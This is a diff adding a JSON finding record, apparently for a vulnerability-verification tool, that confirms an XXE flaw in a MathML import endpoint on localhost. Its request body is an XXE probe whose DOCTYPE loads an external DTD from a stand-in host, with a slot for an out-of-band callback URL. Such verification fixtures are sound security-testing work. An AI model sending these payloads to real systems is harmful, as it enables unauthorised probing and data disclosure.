@@ -1,0 +1,30 @@
+{
+  "finding_id": "GHSA-42hm-pq2f-3r7m",
+  "type": "xxe.oast",
+  "target": {
+    "expected_origin": "http://127.0.0.1:8087",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [8087]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "request": {
+      "method": "POST",
+      "url": "http://127.0.0.1:8087/import/mathml",
+      "headers": [
+        { "name": "content-type", "value": "application/xml" }
+      ],
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE math SYSTEM \"http://placeholder.invalid/dtd\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><mi>1</mi></math>"
+    },
+    "mutation_slots": {
+      "oast_url": "xml_external_entity_url"
+    }
+  },
+  "proof": {
+    "expected_signal": "oast_interaction",
+    "poll_window_seconds": 60
+  }
+}
